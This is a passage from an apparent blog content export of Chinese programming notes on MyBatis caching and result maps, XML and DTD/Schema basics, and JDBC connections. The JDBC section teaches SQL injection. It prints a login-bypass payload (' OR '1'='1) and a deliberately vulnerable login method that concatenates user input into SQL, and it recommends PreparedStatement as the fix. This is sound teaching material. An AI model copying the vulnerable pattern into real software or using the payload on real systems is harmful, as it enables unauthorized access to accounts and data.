的声明如下： 123&lt;resultMap id=&quot;carResult&quot; type=&quot;Car&quot;&gt; &lt;result property=&quot;doorCount&quot; column=&quot;door_count&quot; /&gt;&lt;/resultMap&gt; 那么只有 doorCount 属性会被加载。这是为了即使鉴别器的 case 之间都能分为完全独立的一组，尽管和父结果映射可能没有什么关系。在上面的例子中，我们当然知道 cars 和 vehicles 之间有关系，也就是 Car 是一个 Vehicle。因此，我们希望剩余的属性也能被加载。而这只需要一个小修改。 123&lt;resultMap id=&quot;carResult&quot; type=&quot;Car&quot; extends=&quot;vehicleResult&quot;&gt; &lt;result property=&quot;doorCount&quot; column=&quot;door_count&quot; /&gt;&lt;/resultMap&gt; 现在 vehicleResult 和 carResult 的属性都会被加载了。 可能有人又会觉得映射的外部定义有点太冗长了。 因此，对于那些更喜欢简洁的映射风格的人来说，还有另一种语法可以选择。例如： 1234567891011121314151617181920212223&lt;resultMap id=&quot;vehicleResult&quot; type=&quot;Vehicle&quot;&gt; &lt;id property=&quot;id&quot; column=&quot;id&quot; /&gt; &lt;result property=&quot;vin&quot; column=&quot;vin&quot;/&gt; &lt;result property=&quot;year&quot; column=&quot;year&quot;/&gt; &lt;result property=&quot;make&quot; column=&quot;make&quot;/&gt; &lt;result property=&quot;model&quot; column=&quot;model&quot;/&gt; &lt;result property=&quot;color&quot; column=&quot;color&quot;/&gt; &lt;discriminator javaType=&quot;int&quot; column=&quot;vehicle_type&quot;&gt; &lt;case value=&quot;1&quot; resultType=&quot;carResult&quot;&gt; &lt;result property=&quot;doorCount&quot; column=&quot;door_count&quot; /&gt; &lt;/case&gt; &lt;case value=&quot;2&quot; resultType=&quot;truckResult&quot;&gt; &lt;result property=&quot;boxSize&quot; column=&quot;box_size&quot; /&gt; &lt;result property=&quot;extendedCab&quot; column=&quot;extended_cab&quot; /&gt; &lt;/case&gt; &lt;case value=&quot;3&quot; resultType=&quot;vanResult&quot;&gt; &lt;result property=&quot;powerSlidingDoor&quot; column=&quot;power_sliding_door&quot; /&gt; &lt;/case&gt; &lt;case value=&quot;4&quot; resultType=&quot;suvResult&quot;&gt; &lt;result property=&quot;allWheelDrive&quot; column=&quot;all_wheel_drive&quot; /&gt; &lt;/case&gt; &lt;/discriminator&gt;&lt;/resultMap&gt; 提示 请注意，这些都是结果映射，如果你完全不设置任何的 result 元素，MyBatis 将为你自动匹配列和属性。所以上面的例子大多都要比实际的更复杂。 这也表明，大多数数据库的复杂度都比较高，我们不太可能一直依赖于这种机制。 自动映射正如你在前面一节看到的，在简单的场景下，MyBatis 可以为你自动映射查询结果。但如果遇到复杂的场景，你需要构建一个结果映射。 但是在本节中，你将看到，你可以混合使用这两种策略。让我们深入了解一下自动映射是怎样工作的。 当自动映射查询结果时，MyBatis 会获取结果中返回的列名并在 Java 类中查找相同名字的属性（忽略大小写）。 这意味着如果发现了 ID 列和 id 属性，MyBatis 会将列 ID 的值赋给 id 属性。 通常数据库列使用大写字母组成的单词命名，单词间用下划线分隔；而 Java 属性一般遵循驼峰命名法约定。为了在这两种命名方式之间启用自动映射，需要将 mapUnderscoreToCamelCase 设置为 true。 甚至在提供了结果映射后，自动映射也能工作。在这种情况下，对于每一个结果映射，在 ResultSet 出现的列，如果没有设置手动映射，将被自动映射。在自动映射处理完毕后，再处理手动映射。 在下面的例子中，id 和 userName 列将被自动映射，hashed_password 列将根据配置进行映射。 12345678&lt;select id=&quot;selectUsers&quot; resultMap=&quot;userResultMap&quot;&gt; select user_id as &quot;id&quot;, user_name as &quot;userName&quot;, hashed_password from some_table where id = #&#123;id&#125;&lt;/select&gt; 123&lt;resultMap id=&quot;userResultMap&quot; type=&quot;User&quot;&gt; &lt;result property=&quot;password&quot; column=&quot;hashed_password&quot;/&gt;&lt;/resultMap&gt; 有三种自动映射等级： NONE - 禁用自动映射。仅对手动映射的属性进行映射。 PARTIAL - 对除在内部定义了嵌套结果映射（也就是连接的属性）以外的属性进行映射 FULL - 自动映射所有属性。 默认值是 PARTIAL，这是有原因的。当对连接查询的结果使用 FULL 时，连接查询会在同一行中获取多个不同实体的数据，因此可能导致非预期的映射。 下面的例子将展示这种风险： 12345678&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt; select B.id, B.title, A.username, from Blog B left outer join Author A on B.author_id = A.id where B.id = #&#123;id&#125;&lt;/select&gt; 1234567&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt; &lt;association property=&quot;author&quot; resultMap=&quot;authorResult&quot;/&gt;&lt;/resultMap&gt;&lt;resultMap id=&quot;authorResult&quot; type=&quot;Author&quot;&gt; &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;&lt;/resultMap&gt; 在该结果映射中，Blog 和 Author 均将被自动映射。但是注意 Author 有一个 id 属性，在 ResultSet 中也有一个名为 id 的列，所以 Author 的 id 将填入 Blog 的 id，这可不是你期望的行为。 所以，要谨慎使用 FULL。 无论设置的自动映射等级是哪种，你都可以通过在结果映射上设置 autoMapping 属性来为指定的结果映射设置启用/禁用自动映射。 123&lt;resultMap id=&quot;userResultMap&quot; type=&quot;User&quot; autoMapping=&quot;false&quot;&gt; &lt;result property=&quot;password&quot; column=&quot;hashed_password&quot;/&gt;&lt;/resultMap&gt; 缓存MyBatis 内置了一个强大的事务性查询缓存机制，它可以非常方便地配置和定制。 为了使它更加强大而且易于配置，我们对 MyBatis 3 中的缓存实现进行了许多改进。 默认情况下，只启用了本地的会话缓存，它仅仅对一个会话中的数据进行缓存。 要启用全局的二级缓存，只需要在你的 SQL 映射文件中添加一行： 1&lt;cache/&gt; 基本上就是这样。这个简单语句的效果如下: 映射语句文件中的所有 select 语句的结果将会被缓存。 映射语句文件中的所有 insert、update 和 delete 语句会刷新缓存。 缓存会使用最近最少使用算法（LRU, Least Recently Used）算法来清除不需要的缓存。 缓存不会定时进行刷新（也就是说，没有刷新间隔）。 缓存会保存列表或对象（无论查询方法返回哪种）的 1024 个引用。 缓存会被视为读/写缓存，这意味着获取到的对象并不是共享的，可以安全地被调用者修改，而不干扰其他调用者或线程所做的潜在修改。 提示 缓存只作用于 cache 标签所在的映射文件中的语句。如果你混合使用 Java API 和 XML 映射文件，在共用接口中的语句将不会被默认缓存。你需要使用 @CacheNamespaceRef 注解指定缓存作用域。 这些属性可以通过 cache 元素的属性来修改。比如： 12345&lt;cache eviction=&quot;FIFO&quot; flushInterval=&quot;60000&quot; size=&quot;512&quot; readOnly=&quot;true&quot;/&gt; 这个更高级的配置创建了一个 FIFO 缓存，每隔 60 秒刷新，最多可以存储结果对象或列表的 512 个引用，而且返回的对象被认为是只读的，因此对它们进行修改可能会在不同线程中的调用者产生冲突。 可用的清除策略有： LRU – 最近最少使用：移除最长时间不被使用的对象。 FIFO – 先进先出：按对象进入缓存的顺序来移除它们。 SOFT – 软引用：基于垃圾回收器状态和软引用规则移除对象。 WEAK – 弱引用：更积极地基于垃圾收集器状态和弱引用规则移除对象。 默认的清除策略是 LRU。 flushInterval（刷新间隔）属性可以被设置为任意的正整数，设置的值应该是一个以毫秒为单位的合理时间量。 默认情况是不设置，也就是没有刷新间隔，缓存仅仅会在调用语句时刷新。 size（引用数目）属性可以被设置为任意正整数，要注意欲缓存对象的大小和运行环境中可用的内存资源。默认值是 1024。 readOnly（只读）属性可以被设置为 true 或 false。只读的缓存会给所有调用者返回缓存对象的相同实例。 因此这些对象不能被修改。这就提供了可观的性能提升。而可读写的缓存会（通过序列化）返回缓存对象的拷贝。 速度上会慢一些，但是更安全，因此默认值是 false。 提示 二级缓存是事务性的。这意味着，当 SqlSession 完成并提交时，或是完成并回滚，但没有执行 flushCache=true 的 insert/delete/update 语句时，缓存会获得更新。 使用自定义缓存除了上述自定义缓存的方式，你也可以通过实现你自己的缓存，或为其他第三方缓存方案创建适配器，来完全覆盖缓存行为。 1&lt;cache type=&quot;com.domain.something.MyCustomCache&quot;/&gt; 这个示例展示了如何使用一个自定义的缓存实现。type 属性指定的类必须实现 org.apache.ibatis.cache.Cache 接口，且提供一个接受 String 参数作为 id 的构造器。 这个接口是 MyBatis 框架中许多复杂的接口之一，但是行为却非常简单。 123456789public interface Cache &#123; String getId(); int getSize(); void putObject(Object key, Object value); Object getObject(Object key); boolean hasKey(Object key); Object removeObject(Object key); void clear();&#125; 为了对你的缓存进行配置，只需要简单地在你的缓存实现中添加公有的 JavaBean 属性，然后通过 cache 元素传递属性值，例如，下面的例子将在你的缓存实现上调用一个名为 setCacheFile(String file) 的方法： 123&lt;cache type=&quot;com.domain.something.MyCustomCache&quot;&gt; &lt;property name=&quot;cacheFile&quot; value=&quot;/tmp/my-custom-cache.tmp&quot;/&gt;&lt;/cache&gt; 你可以使用所有简单类型作为 JavaBean 属性的类型，MyBatis 会进行转换。 你也可以使用占位符（如 $&#123;cache.file&#125;），以便替换成在配置文件属性中定义的值。 从版本 3.4.2 开始，MyBatis 已经支持在所有属性设置完毕之后，调用一个初始化方法。 如果想要使用这个特性，请在你的自定义缓存类里实现 org.apache.ibatis.builder.InitializingObject 接口。 123public interface InitializingObject &#123; void initialize() throws Exception;&#125; 提示 上一节中对缓存的配置（如清除策略、可读或可读写等），不能应用于自定义缓存。 请注意，缓存的配置和缓存实例会被绑定到 SQL 映射文件的命名空间中。 因此，同一命名空间中的所有语句和缓存将通过命名空间绑定在一起。 每条语句可以自定义与缓存交互的方式，或将它们完全排除于缓存之外，这可以通过在每条语句上使用两个简单属性来达成。 默认情况下，语句会这样来配置： 1234&lt;select ... flushCache=&quot;false&quot; useCache=&quot;true&quot;/&gt;&lt;insert ... flushCache=&quot;true&quot;/&gt;&lt;update ... flushCache=&quot;true&quot;/&gt;&lt;delete ... flushCache=&quot;true&quot;/&gt; 鉴于这是默认行为，显然你永远不应该以这样的方式显式配置一条语句。但如果你想改变默认的行为，只需要设置 flushCache 和 useCache 属性。比如，某些情况下你可能希望特定 select 语句的结果排除于缓存之外，或希望一条 select 语句清空缓存。类似地，你可能希望某些 update 语句执行时不要刷新缓存。 cache-ref回想一下上一节的内容，对某一命名空间的语句，只会使用该命名空间的缓存进行缓存或刷新。 但你可能会想要在多个命名空间中共享相同的缓存配置和实例。要实现这种需求，你可以使用 cache-ref 元素来引用另一个缓存。 1&lt;cache-ref namespace=&quot;com.someone.application.data.SomeMapper&quot;/&gt; 12.动态SQL 什么是动态SQL？ 根据不同的条件生成不同的SQL语句 13.Mybatis缓存机","categories":[],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/markdown/"}]},{"title":"XML","slug":"XML","date":"2021-07-21T13:36:51.000Z","updated":"2021-07-22T01:07:45.158Z","comments":true,"path":"2021/07/21/XML/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/21/XML/","excerpt":"","text":"XML 概念：Extersible Markup Language，可扩展标记语言。 可扩展：标签都是自定义的。 功能：存储数据 作为配置文件 在网络中传输 XML与HTML区别： ​ XML标签都是自定义的，HTML标签都是预定义的。 ​ XML语法严格，HTML语法松散。 ​ XML用于存储数据，XML用于展示数据。 W3C：万维网联盟 properties：配置文件，数据存储文件。 基本语法 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;users&gt; &lt;user id=&quot;1&quot;&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/user&gt; &lt;user id=&quot;2&quot;&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/user&gt; &lt;user&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/user&gt; &lt;user id=&quot;3&quot;&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/user&gt;&lt;/users&gt; ?xml文档声明必须在第一行 有且仅有一个根标签，属性值必须使用引号引起来（单双都可以） 标签必须正确关闭 xml标签区分大小写 xml组成部分： ​ 文档声明 ​ 1.格式：&lt;?xml 属性列表 ?&gt; ​ 2.属性列表： ​ version：版本号，必须的属性。 ​ encoding：：编码方式，告知解析引擎当前文档使用的编码方式，默认为ISO-8859-1。 ​ standalone：是否独立，取值[yes|no]：是否依赖其他文件。 ​ 指令 ​ 结合CSS 12345678&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;no&#x27; ?&gt;&lt;?xml-stylesheet type=&#x27;text/css&#x27; hredf=&#x27;a.css&#x27;&gt;&lt;users&gt; &lt;user&gt; &lt;name&gt;张加林&lt;name/&gt; &lt;age&gt;20&lt;age&gt; &lt;user&gt;&lt;users/&gt; ​ 标签：标签名自定义。 名称可以包含字母、数字以及其他的字符 名称不能以数字或者标点符号开始 名称不能以字母 xml（或者 XML、Xml 等等）开始 名称不能包含空格 属性：id值唯一 文本：特殊字符需要使用转义 ​ CDATA区：在该区域的数据会被原样展示。 12345&lt;test&gt; &lt;![CDATA[ if(a&lt;b &amp;&amp; a&gt;c)&#123;&#125; ]]&gt;&lt;/test&gt; 约束编写XML：用户，软件使用者 解析XML：软件（半成品软件，如：框架），一般软件会有XML文档书写的说明规则（约束文档）。 用户和软件之间可以通过XML文档进行交互。 约束：规定XML文档的书写规则 能够在XML中引入约束文档 能够简单的读懂约束文档 分类： DTD：一种简单的约束技术 引入DTD文档到XML文档中 内部DTD：将约束规则定义在xml文档中 外部DTD：将约束规则定义于外部的DTD文件中 12本地引入：&lt;!DOCTYPE 根标签名 SYSTEM &quot;DTD文件的位置&quot;&gt;网络引入：&lt;!DOCTYPE 根标签名 PUBLIC &quot;DTD文件的名字&quot; &quot;DTD文件的位置URL&quot;&gt; 123456&lt;!ELEMENT students (student+)&gt;&lt;!ELEMENT student (name,age,gender)&gt;&lt;!ELEMENT name (#PCDATA)&gt;&lt;!ELEMENT age (#PCDATA)&gt;&lt;!ELEMENT gender (#PCDATA)&gt;&lt;!ATTLIST student number ID #REQUIRED&gt; 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE students SYSTEM &quot;student.dtd&quot;&gt;&lt;students&gt; &lt;student number=&quot;s001&quot;&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;20&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/student&gt; &lt;student number=&quot;s002&quot;&gt; &lt;name&gt;张加林&lt;/name&gt; &lt;age&gt;20&lt;/age&gt; &lt;gender&gt;男&lt;/gender&gt; &lt;/student&gt;&lt;/students&gt; 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!--直接引入--&gt;&lt;!DOCTYPE students SYSTEM [&lt;!ELEMENT students (student+)&gt;&lt;!ELEMENT student (name,age,gender)&gt;&lt;!ELEMENT name (#PCDATA)&gt;&lt;!ELEMENT age (#PCDATA)&gt;&lt;!ELEMENT gender (#PCDATA)&gt;&lt;!ATTLIST student number ID #REQUIRED&gt;]&gt; Schema：复杂的约束技术，可以限定内容 123456789101112131415161718192021222324252627282930313233&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt;&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;xs:element name=&quot;shiporder&quot;&gt; &lt;xs:complexType&gt; &lt;xs:sequence&gt; &lt;xs:element name=&quot;orderperson&quot; type=&quot;xs:string&quot;/&gt; &lt;xs:element name=&quot;shipto&quot;&gt; &lt;xs:complexType&gt; &lt;xs:sequence&gt; &lt;xs:element name=&quot;name&quot; type=&quot;xs:string&quot;/&gt; &lt;xs:element name=&quot;address&quot; type=&quot;xs:string&quot;/&gt; &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot;/&gt; &lt;xs:element name=&quot;country&quot; type=&quot;xs:string&quot;/&gt; &lt;/xs:sequence&gt; &lt;/xs:complexType&gt; &lt;/xs:element&gt; &lt;xs:element name=&quot;item&quot; maxOccurs=&quot;unbounded&quot;&gt; &lt;xs:complexType&gt; &lt;xs:sequence&gt; &lt;xs:element name=&quot;title&quot; type=&quot;xs:string&quot;/&gt; &lt;xs:element name=&quot;note&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt; &lt;xs:element name=&quot;quantity&quot; type=&quot;xs:positiveInteger&quot;/&gt; &lt;xs:element name=&quot;price&quot; type=&quot;xs:decimal&quot;/&gt; &lt;/xs:sequence&gt; &lt;/xs:complexType&gt; &lt;/xs:element&gt; &lt;/xs:sequence&gt; &lt;xs:attribute name=&quot;orderid&quot; type=&quot;xs:string&quot; use=&quot;required&quot;/&gt; &lt;/xs:complexType&gt;&lt;/xs:element&gt;&lt;/xs:schema&gt; 1234567&lt;a:根标签名 xmlns:itcast=&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.itcast.cn/xml student.xsd http://www.itcast.cn/xml2 student2.xsd&quot; xmlns:a=&quot;http://www.itcast.cn/xml&quot; xmlns:b=&quot;http://www.itcast.cn/xml2&quot;&gt;&lt;a:students &gt;&lt;!--所有标签前面必须加a:(别名)--&gt; 填写xml文档的根元素 引入xml前缀，xmlns:xsi=”http://www.w3.org/2001/XMLschema-instance&quot; 引入xsd文件命名空间 xsi:a=”http://www.itcast.cn/xml 文件名.xsd” 为每一个xsd约束声明一个前缀，作为标识，xmlns=”http://www.itcast/xml&quot; 解析解析：操作xml文档，将文档中的数据读取到内存中。 操作xml文档 解析(读取)：将文档中的数据读取到内存中 写入：将内存中的数据保存到xml文档中。持久化存储。 解析xml的方式 DOM：将标记语言文档一次性加载进内存，在内存中会形成一颗内存树 优点：操作方便，可以对文档进行CRUD的所有操作 缺点：占用内存严重 SAX 逐行读取（读一行，内存释放上一行），基于事件驱动的。 优点：基本不占用内存 缺点：只能读取，不能增删改 服务器端使用DOM思想，移动端使用SAX思想 常见解析器 JAXP：SUN公司提供，支持DOM和SAX两种思想，但是一般不用，因为效果较差。 DOM4J：一款优秀的解析器 Jsoup：一款Java的HTML解析器，可直接解析某个URL地址、HTML文本内容。提供了一套非常省力的API，可以通过DOM、CSS以及类似于jQuery的操作方法来取出和操作数据。 PULL：Android操作系统内置的解析器，SAX方式。 Jsoup 使用步骤： 导入jar包 获取Document对象 获取对应的标签Element对象 获取数据下","categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/XML/"}]},{"title":"JDBC核心技术","slug":"JDBC","date":"2021-07-21T11:08:21.000Z","updated":"2021-07-21T11:11:56.773Z","comments":true,"path":"2021/07/21/JDBC/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/21/JDBC/","excerpt":"","text":"JDBC核心技术讲师：宋红康 哔哩哔哩： 第1章：JDBC概述1.1 数据的持久化 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，数据持久化意味着将内存中的数据保存到硬盘上加以”固化”，而持久化的实现过程大多通过各种关系数据库来完成。 持久化的主要应用是将内存中的数据存储在关系型数据库中，当然也可以存储在磁盘文件、XML数据文件中。 1.2 Java中的数据存储技术 在Java中，数据库存取技术可分为如下几类： JDBC直接访问数据库 JDO (Java Data Object )技术 第三方O/R工具，如Hibernate, Mybatis 等 JDBC是java访问数据库的基石，JDO、Hibernate、MyBatis等只是更好的封装了JDBC。 1.3 JDBC介绍 JDBC(Java Database Connectivity)是一个独立于特定数据库管理系统、通用的SQL数据库存取和操作的公共接口（一组API），定义了用来访问数据库的标准Java类库，（java.sql,javax.sql）使用这些类库可以以一种标准的方法、方便地访问数据库资源。 JDBC为访问不同的数据库提供了一种统一的途径，为开发者屏蔽了一些细节问题。 JDBC的目标是使Java程序员使用JDBC可以连接任何提供了JDBC驱动程序的数据库系统，这样就使得程序员无需对特定的数据库系统的特点有过多的了解，从而大大简化和加快了开发过程。 如果没有JDBC，那么Java程序访问数据库时是这样的： 有了JDBC，Java程序访问数据库时是这样的： 总结如下： 1.4 JDBC体系结构 JDBC接口（API）包括两个层次： 面向应用的API：Java API，抽象接口，供应用程序开发人员使用（连接数据库，执行SQL语句，获得结果）。 面向数据库的API：Java Driver API，供开发商开发数据库驱动程序用。 JDBC是sun公司提供一套用于数据库操作的接口，java程序员只需要面向这套接口编程即可。 不同的数据库厂商，需要针对这套接口，提供不同实现。不同的实现的集合，即为不同数据库的驱动。 ————面向接口编程 1.5 JDBC程序编写步骤 补充：ODBC(Open Database Connectivity，开放式数据库连接)，是微软在Windows平台下推出的。使用者在程序中只需要调用ODBC API，由 ODBC 驱动程序将调用转换成为对特定的数据库的调用请求。 第2章：获取数据库连接2.1 要素一：Driver接口实现类2.1.1 Driver接口介绍 java.sql.Driver 接口是所有 JDBC 驱动程序需要实现的接口。这个接口是提供给数据库厂商使用的，不同数据库厂商提供不同的实现。 在程序中不需要直接去访问实现了 Driver 接口的类，而是由驱动程序管理器类(java.sql.DriverManager)去调用这些Driver实现。 Oracle的驱动：oracle.jdbc.driver.OracleDriver mySql的驱动： com.mysql.jdbc.Driver 将上述jar包拷贝到Java工程的一个目录中，习惯上新建一个lib文件夹。 在驱动jar上右键–&gt;Build Path–&gt;Add to Build Path 注意：如果是Dynamic Web Project（动态的web项目）话，则是把驱动jar放到WebContent（有的开发工具叫WebRoot）目录中的WEB-INF目录中的lib目录下即可 2.1.2 加载与注册JDBC驱动 加载驱动：加载 JDBC 驱动需调用 Class 类的静态方法 forName()，向其传递要加载的 JDBC 驱动的类名 Class.forName(“com.mysql.jdbc.Driver”); 注册驱动：DriverManager 类是驱动程序管理器类，负责管理驱动程序 使用DriverManager.registerDriver(com.mysql.jdbc.Driver)来注册驱动 通常不用显式调用 DriverManager 类的 registerDriver() 方法来注册驱动程序类的实例，因为 Driver 接口的驱动程序类都包含了静态代码块，在这个静态代码块中，会调用 DriverManager.registerDriver() 方法来注册自身的一个实例。下图是MySQL的Driver实现类的源码： 2.2 要素二：URL JDBC URL 用于标识一个被注册的驱动程序，驱动程序管理器通过这个 URL 选择正确的驱动程序，从而建立到数据库的连接。 JDBC URL的标准由三部分组成，各部分间用冒号分隔。 jdbc:子协议:子名称 协议：JDBC URL中的协议总是jdbc 子协议：子协议用于标识一个数据库驱动程序 子名称：一种标识数据库的方法。子名称可以依不同的子协议而变化，用子名称的目的是为了定位数据库提供足够的信息。包含主机名(对应服务端的ip地址)，端口号，数据库名 举例： 几种常用数据库的 JDBC URL MySQL的连接URL编写方式： jdbc:mysql://主机名称:mysql服务端口号/数据库名称?参数=值&amp;参数=值 jdbc:mysql://localhost:3306/atguigu jdbc:mysql://localhost:3306/atguigu**?useUnicode=true&amp;characterEncoding=utf8**（如果JDBC程序与服务器端的字符集不一致，会导致乱码，那么可以通过参数指定服务器端的字符集） jdbc:mysql://localhost:3306/atguigu?user=root&amp;password=123456 Oracle 9i的连接URL编写方式： jdbc:oracle:thin:@主机名称:oracle服务端口号:数据库名称 jdbc:oracle:thin:@localhost:1521:atguigu SQLServer的连接URL编写方式： jdbc:sqlserver://主机名称:sqlserver服务端口号:DatabaseName=数据库名称 jdbc:sqlserver://localhost:1433:DatabaseName=atguigu 2.3 要素三：用户名和密码 user,password可以用“属性名=属性值”方式告诉数据库 可以调用 DriverManager 类的 getConnection() 方法建立到数据库的连接 2.4 数据库连接方式举例2.4.1 连接方式一12345678910111213141516171819202122@Test public void testConnection1() &#123; try &#123; //1.提供java.sql.Driver接口实现类的对象 Driver driver = null; driver = new com.mysql.jdbc.Driver(); //2.提供url，指明具体操作的数据 String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //3.提供Properties的对象，指明用户名和密码 Properties info = new Properties(); info.setProperty(&quot;user&quot;, &quot;root&quot;); info.setProperty(&quot;password&quot;, &quot;abc123&quot;); //4.调用driver的connect()，获取连接 Connection conn = driver.connect(url, info); System.out.println(conn); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; 说明：上述代码中显式出现了第三方数据库的API 2.4.2 连接方式二123456789101112131415161718192021222324@Test public void testConnection2() &#123; try &#123; //1.实例化Driver String className = &quot;com.mysql.jdbc.Driver&quot;; Class clazz = Class.forName(className); Driver driver = (Driver) clazz.newInstance(); //2.提供url，指明具体操作的数据 String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //3.提供Properties的对象，指明用户名和密码 Properties info = new Properties(); info.setProperty(&quot;user&quot;, &quot;root&quot;); info.setProperty(&quot;password&quot;, &quot;abc123&quot;); //4.调用driver的connect()，获取连接 Connection conn = driver.connect(url, info); System.out.println(conn); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 说明：相较于方式一，这里使用反射实例化Driver，不在代码中体现第三方数据库的API。体现了面向接口编程思想。 2.4.3 连接方式三12345678910111213141516171819202122@Test public void testConnection3() &#123; try &#123; //1.数据库连接的4个基本要素： String url = &quot;jdbc:mysql://localhost:3306/test&quot;; String user = &quot;root&quot;; String password = &quot;abc123&quot;; String driverName = &quot;com.mysql.jdbc.Driver&quot;; //2.实例化Driver Class clazz = Class.forName(driverName); Driver driver = (Driver) clazz.newInstance(); //3.注册驱动 DriverManager.registerDriver(driver); //4.获取连接 Connection conn = DriverManager.getConnection(url, user, password); System.out.println(conn); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 说明：使用DriverManager实现数据库的连接。体会获取连接必要的4个基本要素。 2.4.4 连接方式四12345678910111213141516171819202122232425262728293031323334353637@Test public void testConnection4() &#123; try &#123; //1.数据库连接的4个基本要素： String url = &quot;jdbc:mysql://localhost:3306/test&quot;; String user = &quot;root&quot;; String password = &quot;abc123&quot;; String driverName = &quot;com.mysql.jdbc.Driver&quot;; //2.加载驱动 （①实例化Driver ②注册驱动） Class.forName(driverName); //Driver driver = (Driver) clazz.newInstance(); //3.注册驱动 //DriverManager.registerDriver(driver); /* 可以注释掉上述代码的原因，是因为在mysql的Driver类中声明有： static &#123; try &#123; DriverManager.registerDriver(new Driver()); &#125; catch (SQLException var1) &#123; throw new RuntimeException(&quot;Can&#x27;t register driver!&quot;); &#125; &#125; */ //3.获取连接 Connection conn = DriverManager.getConnection(url, user, password); System.out.println(conn); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 说明：不必显式的注册驱动了。因为在DriverManager的源码中已经存在静态代码块，实现了驱动的注册。 2.4.5 连接方式五(最终版)123456789101112131415161718192021@Test public void testConnection5() throws Exception &#123; //1.加载配置文件 InputStream is = ConnectionTest.class.getClassLoader().getResourceAsStream(&quot;jdbc.properties&quot;); Properties pros = new Properties(); pros.load(is); //2.读取配置信息 String user = pros.getProperty(&quot;user&quot;); String password = pros.getProperty(&quot;password&quot;); String url = pros.getProperty(&quot;url&quot;); String driverClass = pros.getProperty(&quot;driverClass&quot;); //3.加载驱动 Class.forName(driverClass); //4.获取连接 Connection conn = DriverManager.getConnection(url,user,password); System.out.println(conn); &#125; 其中，配置文件声明在工程的src目录下：【jdbc.properties】 1234user=rootpassword=abc123url=jdbc:mysql://localhost:3306/testdriverClass=com.mysql.jdbc.Driver 说明：使用配置文件的方式保存配置信息，在代码中加载配置文件 使用配置文件的好处： ①实现了代码和数据的分离，如果需要修改配置信息，直接在配置文件中修改，不需要深入代码②如果修改了配置信息，省去重新编译的过程。 第3章：使用PreparedStatement实现CRUD操作3.1 操作和访问数据库 数据库连接被用于向数据库服务器发送命令和 SQL 语句，并接受数据库服务器返回的结果。其实一个数据库连接就是一个Socket连接。 在 java.sql 包中有 3 个接口分别定义了对数据库的调用的不同方式： Statement：用于执行静态 SQL 语句并返回它所生成结果的对象。 PrepatedStatement：SQL 语句被预编译并存储在此对象中，可以使用此对象多次高效地执行该语句。 CallableStatement：用于执行 SQL 存储过程 3.2 使用Statement操作数据表的弊端 通过调用 Connection 对象的 createStatement() 方法创建该对象。该对象用于执行静态的 SQL 语句，并且返回执行结果。 Statement 接口中定义了下列方法用于执行 SQL 语句： 12int excuteUpdate(String sql)：执行更新操作INSERT、UPDATE、DELETEResultSet executeQuery(String sql)：执行查询操作SELECT 但是使用Statement操作数据表存在弊端： 问题一：存在拼串操作，繁琐 问题二：存在SQL注入问题 SQL 注入是利用某些系统没有对用户输入的数据进行充分的检查，而在用户输入数据中注入非法的 SQL 语句段或命令(如：SELECT user, password FROM user_table WHERE user=’a’ OR 1 = ‘ AND password = ‘ OR ‘1’ = ‘1’) ，从而利用系统的 SQL 引擎完成恶意行为的做法。 对于 Java 而言，要防范 SQL 注入，只要用 PreparedStatement(从Statement扩展而来) 取代 Statement 就可以了。 代码演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110public class StatementTest &#123; // 使用Statement的弊端：需要拼写sql语句，并且存在SQL注入的问题 @Test public void testLogin() &#123; Scanner scan = new Scanner(System.in); System.out.print(&quot;用户名：&quot;); String userName = scan.nextLine(); System.out.print(&quot;密 码：&quot;); String password = scan.nextLine(); // SELECT user,password FROM user_table WHERE USER = &#x27;1&#x27; or &#x27; AND PASSWORD = &#x27;=&#x27;1&#x27; or &#x27;1&#x27; = &#x27;1&#x27;; String sql = &quot;SELECT user,password FROM user_table WHERE USER = &#x27;&quot; + userName + &quot;&#x27; AND PASSWORD = &#x27;&quot; + password + &quot;&#x27;&quot;; User user = get(sql, User.class); if (user != null) &#123; System.out.println(&quot;登陆成功!&quot;); &#125; else &#123; 